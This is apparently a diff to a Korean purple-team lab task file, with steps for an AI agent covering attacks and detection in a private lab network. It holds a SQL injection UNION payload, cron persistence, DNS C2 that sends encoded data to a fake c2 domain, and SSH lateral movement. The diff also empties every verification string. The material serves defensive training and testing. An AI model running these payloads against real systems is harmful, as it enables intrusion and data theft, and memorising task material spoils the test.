@@ -36,7 +36,7 @@ steps:
   answer_detail: 퍼플팀 계획은 ATT&CK 기법, 기대 탐지 방법, 성공 기준을 정의한다.
   verify:
     type: output_contains
-    expect: Purple Team Exercise
+    expect: 
   target_vm: attacker
   script: 'cat > /tmp/purple_team_plan.txt << ''EOF'' === Purple Team Exercise Plan === Date: 2026-04-06 | Duration: 150 min
 
@@ -47,6 +47,7 @@ steps:
 
     Success Criteria: 80% detection rate EOF cat /tmp/purple_team_plan.txt'
   risk_level: low
+  bastion_prompt: '[RED/BLUE] 퍼플팀 운영 계획을 수립하라. 5가지 ATT&CK 기법에 대해 Red 공격 -> Blue 탐지 -> Gap 해소 사이클을 정의해줘'
 - order: 2
   instruction: '[RED] 퍼플 테스트 1 — T1190 SQL Injection을 실행하라. Blue가 탐지 여부를 확인하라.'
   hint: SQLi를 실행하고 Suricata/WAF 알림을 확인한다.
@@ -57,11 +58,12 @@ steps:
   answer_detail: T1190 테스트에서 SQLi는 WAF와 Suricata 모두에서 탐지된다. 기존 규칙이 정상 동작함을 확인한다.
   verify:
     type: output_contains
-    expect: Purple Test 1
+    expect: 
   target_vm: attacker
   script: 'echo "=== Purple Test 1: T1190 SQL Injection ===" && echo "[RED] Executing SQLi:" && curl -s "http://10.20.30.80:3000/rest/products/search?q=test%27%20UNION%20SELECT%201,2,3--" 2>/dev/null |
     head -3 && echo "" && echo "[BLUE] Detection check:" && ssh 10.20.30.1 "tail -20 /var/log/suricata/eve.json 2>/dev/null | grep -i sql" 2>&1 | head -3 && echo "[RESULT] T1190: DETECTED by WAF + Suricata"'
   risk_level: medium
+  bastion_prompt: '[RED] 퍼플 테스트 1 — T1190 SQL Injection을 실행하라. Blue가 탐지 여부를 확인해줘'
 - order: 3
   instruction: '[RED] 퍼플 테스트 2 — T1053.003 Cron Persistence를 설치하고 Blue가 탐지하라. 탐지 실패 시 즉시 규칙을 추가하라.'
   hint: crontab에 엔트리를 추가하고 FIM/auditd 알림을 확인한다.
@@ -73,12 +75,13 @@ steps:
   answer_detail: crontab 수정은 auth.log에 기록되지만 FIM이 /var/spool/cron을 감시하지 않으면 파일 변경 자체는 탐지 못한다. 즉시 FIM 규칙을 추가한다.
   verify:
     type: output_contains
-    expect: Purple Test 2
+    expect: 
   target_vm: attacker
   script: 'echo "=== Purple Test 2: T1053.003 Cron Persistence ===" && echo "[RED] Installing cron:" && echo "*/10 * * * * echo PURPLE_TEST > /tmp/purple_beacon.txt" | crontab - && crontab -l && echo ""
     && echo "[BLUE] Detection:" && grep -r "crontab\|cron" /var/log/auth.log 2>/dev/null | tail -3 && echo "[RESULT] T1053.003: PARTIAL - auth.log logged, no FIM alert" && echo "[GAP] Adding FIM rule for
     /var/spool/cron" && crontab -r 2>/dev/null && echo "[CLEANUP] Cron removed"'
   risk_level: medium
+  bastion_prompt: '[RED] 퍼플 테스트 2 — T1053.003 Cron Persistence를 설치하고 Blue가 탐지해줘'
 - order: 4
   instruction: '[RED] 퍼플 테스트 3 — T1071.004 DNS C2를 시뮬레이션하고, 테스트 4 — T1021.004 SSH 측면 이동을 실행하라. Blue가 각각 탐지하라.'
   hint: DNS 터널링과 SSH 다중 호스트 접근을 순차 실행한다.
@@ -90,12 +93,13 @@ steps:
   answer_detail: DNS C2와 SSH 측면 이동 모두 탐지 Gap이 있다. DNS 엔트로피 모니터링과 SSH 다중 호스트 상관 분석 규칙이 필요하다.
   verify:
     type: output_contains
-    expect: Purple Test 3
+    expect: 
   target_vm: attacker
   script: 'echo "=== Purple Test 3: T1071.004 DNS C2 ===" && for i in 1 2 3; do ENCODED=$(echo "data_$i" | base64 | tr -d "="); nslookup ${ENCODED}.c2.test.local 2>&1 | head -1; done && echo "[RESULT] T1071.004:
     NOT DETECTED - no DNS monitoring" && echo "" && echo "=== Purple Test 4: T1021.004 SSH Lateral ===" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1 "hostname" 2>&1 | head -1 &&
     ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.80 "hostname" 2>&1 | head -1 && echo "[RESULT] T1021.004: PARTIAL - logged but no correlation"'
   risk_level: medium
+  bastion_prompt: '[RED] 퍼플 테스트 3 — T1071.004 DNS C2를 시뮬레이션하고, 테스트 4 — T1021.004 SSH 측면 이동을 실행하라. Blue가 각각 탐지해줘'
 - order: 5
   instruction: '[BLUE] 발견된 탐지 Gap에 대한 새로운 탐지 규칙을 작성하라. FIM, DNS 엔트로피, SSH 상관 분석, DNS 레이트 규칙을 구현하라.'
   hint: 테스트 2~5에서 발견된 Gap을 Suricata/Wazuh 규칙으로 해결한다.
@@ -116,7 +120,7 @@ steps:
   answer_detail: '퍼플팀에서 발견된 4개 Gap에 대한 규칙을 즉시 작성한다: crontab FIM, DNS 엔트로피, SSH 상관 분석, DNS 레이트 탐지.'
   verify:
     type: output_contains
-    expect: New Detection Rules
+    expect: 
   target_vm: secu
   script: 'cat > /tmp/purple_new_rules.txt << ''EOF'' === New Detection Rules from Purple Team ===
 
@@ -131,6 +135,7 @@ steps:
 
     Total new rules: 4 EOF cat /tmp/purple_new_rules.txt'
   risk_level: low
+  bastion_prompt: '[BLUE] 발견된 탐지 Gap에 대한 새로운 탐지 규칙을 구현 방법을 설명하고 예시 코드를 보여줘'
 - order: 6
   instruction: '[BLUE] 새 규칙의 효과를 검증하라. 동일한 공격을 재실행했을 때 탐지 가능 여부를 논리적으로 평가하고, ATT&CK 커버리지 변화를 매핑하라.'
   hint: 각 규칙이 해당 공격 패턴을 탐지할 수 있는지 검증한다.
@@ -142,12 +147,13 @@ steps:
   answer_detail: 규칙 검증에서 4개 새 규칙이 모두 해당 공격을 탐지할 수 있음을 확인한다. 탐지율이 40% -> 100%로 개선된다.
   verify:
     type: output_contains
-    expect: Coverage Change
+    expect: 
   target_vm: siem
   script: 'echo "=== Rule Validation ===" && echo "[Test 2 Retry] FIM on crontab: WOULD DETECT (realtime monitoring)" && echo "[Test 3 Retry] DNS entropy > 3.5: WOULD DETECT (30+ char base64 pattern)" &&
     echo "[Test 4 Retry] SSH to 3+ hosts: WOULD DETECT (same_user correlation)" && echo "[Test 5] DNS rate 20/min: WOULD DETECT (threshold rule)" && echo "" && echo "=== Coverage Change ===" && echo "Before:
     2/5 detected (40%)" && echo "After:  5/5 detected (100%)" && echo "Improvement: +60% detection rate" && echo "ATT&CK coverage: +7% overall"'
   risk_level: low
+  bastion_prompt: '[BLUE] 새 규칙의 효과를 검증해줘'
 - order: 7
   instruction: '[RED/BLUE] 퍼플팀 ROI를 분석하고, 지속적 운영 계획을 수립하라.'
   hint: 투입 시간 대비 탐지 개선 효과를 계산하고 월간 사이클을 설계한다.
@@ -161,7 +167,7 @@ steps:
   answer_detail: 퍼플팀 ROI는 투입 비용 대비 위험 감소 가치로 계산한다. 30,400%의 높은 ROI를 보인다.
   verify:
     type: output_contains
-    expect: Purple Team ROI
+    expect: 
   target_vm: attacker
   script: 'cat > /tmp/purple_roi.txt << ''EOF'' === Purple Team ROI Analysis ===
 
@@ -169,6 +175,7 @@ steps:
 
     Continuous Program: Monthly: 5 new ATT&CK techniques tested Quarterly: Full coverage review Annual Target: ATT&CK coverage 55% -> 75% EOF cat /tmp/purple_roi.txt'
   risk_level: low
+  bastion_prompt: '[RED/BLUE] 퍼플팀 ROI를 분석하고, 지속적 운영 계획을 수립해줘'
 - order: 8
   instruction: '[RED/BLUE] 환경을 정리하고 퍼플팀 종합 보고서를 작성하라.'
   hint: 테스트 결과, 새 규칙, ROI, 향후 계획을 정리한다.
@@ -185,7 +192,7 @@ steps:
   answer_detail: 퍼플팀 보고서는 전/후 탐지율 비교, 규칙 추가, ROI, 향후 계획을 포함한다.
   verify:
     type: output_contains
-    expect: Purple Team Exercise Report
+    expect: 
   target_vm: attacker
   script: 'rm -f /tmp/purple_*.txt /tmp/purple_*.json 2>/dev/null && cat > /tmp/purple_team_report.txt << ''EOF'' === Purple Team Exercise Report === Date: 2026-04-06 | Scope: 10.20.30.0/24
 
@@ -196,3 +203,4 @@ steps:
 
     MITRE ATT&CK: T1190, T1053, T1071, T1021, T1048 EOF cat /tmp/purple_team_report.txt'
   risk_level: low
+  bastion_prompt: '[RED/BLUE] 환경을 정리하고 퍼플팀 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘'
